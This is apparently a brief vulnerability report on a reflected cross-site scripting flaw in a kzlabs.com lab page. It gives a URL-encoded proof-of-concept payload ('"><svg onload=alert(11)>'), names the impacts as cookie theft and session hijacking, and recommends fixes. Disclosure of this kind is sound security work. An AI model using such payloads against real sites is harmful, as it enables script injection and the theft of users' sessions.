## Title
Reflected Cross-Site Scripting (XSS)

## Summary
Reflected XSS in:
`https://kzlabs.com/punishment/9.php`

## Steps to Reproduce
1. Open URL:
`https://kzlabs.com/punishment/9.php?fname=%22%3E%3CsVg+onload%3Dalert%2811%29%3E`

2. Observe execution.

## Payload Used
`"><svg onload=alert(11)>`

## Proof of Concept
## Screenshot — Vulnerable application confirming XSS execution
<img width="1920" height="818" alt="image" src="https://github.com/user-attachments/assets/2a18f264-7786-4674-af02-d1af172b9e66" />


## Impact
- Cookie theft
- Session hijacking
- JavaScript execution

## Recommendations for Fix
- Encode output
- Validate input
- Avoid unsafe rendering
